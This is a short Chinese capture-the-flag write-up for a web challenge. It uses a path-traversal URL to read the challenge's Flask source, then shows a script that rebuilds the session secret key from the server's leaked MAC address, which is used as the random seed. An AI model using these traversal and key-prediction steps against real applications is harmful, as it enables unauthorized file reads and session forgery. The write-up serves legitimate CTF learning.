# 华东南赛区
## Web4
`/read?url=../../../../../app/app.py`

读文件

```PYTHON
# encoding:utf-8 
import re, random, uuid, urllib 
from flask import Flask, session, request 
app = Flask(__name__) 
random.seed(uuid.getnode()) 
app.config['SECRET_KEY'] = str(random.random()*233) 
app.debug = True 
@app.route('/') 
def index(): 
	session['username'] = 'www-data' 
	return 'Hello World! [Read somethings](http://cb213263-1df5-4b41-a3c8-f92a7bbca3ba.node5.buuoj.cn:81/read?url=https://baidu.com)' 
@app.route('/read') 
def read(): try: 
	url = request.args.get('url') 
	m = re.findall('^file.*', url, re.IGNORECASE) 
	n = re.findall('flag', url, re.IGNORECASE) 
	
	if m or n: 
		return 'No Hack' 
	res = urllib.urlopen(url) 
	return res.read() 
	except Exception as ex: 
		print str(ex) 
		return 'no response' 
@app.route('/flag') 
def flag(): 
	if session and session['username'] == 'fuck': 
		return open('/flag.txt').read() 
	else: 
		return 'Access denied' 
if __name__=='__main__': 
	app.run( debug=True, host="0.0.0.0" )
```

```
uuidnode : b6:b9:c3:9f:68:8e
```


```PYTHON
# encoding:utf-8
import random
import flask
random.seed(0xb6b9c39f688e)
key = str(random.random()*233)
print(key)
```
代码取了mac地址作为随机数种子，解出结构

![](attachments/Pasted%20image%2020240412100043.png)

![](attachments/Pasted%20image%2020240412100534.png)